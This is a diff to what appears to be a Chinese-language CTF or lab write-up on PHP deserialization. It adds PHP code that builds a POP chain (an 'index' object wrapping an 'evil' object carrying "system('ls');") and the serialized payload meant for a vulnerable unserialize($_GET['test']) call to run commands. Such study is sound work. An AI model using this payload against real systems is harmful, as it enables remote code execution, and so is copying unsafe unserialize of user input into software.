@@ -43,5 +43,46 @@ unserialize($_GET['test']);
 
 重新构造一个test为新的对象，pop链：
 ```php
+<?php
 
+//highlight_file(__FILE__);
+
+error_reporting(0);
+
+class index
+
+{
+
+    private $test;
+
+    public function __construct()
+
+    {
+
+        $this->test = new evil();
+
+    }
+
+}
+
+class evil
+
+{
+
+    var $test2 = "system('ls');";
+
+}
+
+  
+
+$a = new index();
+
+echo serialize($a);
+
+?>
 ```
+得到能够触发漏洞的$test
+```php
+O:5:"index":1:{s:11:"indextest";O:4:"evil":1:{s:5:"test2";s:13:"system('ls');";}}
+```
+
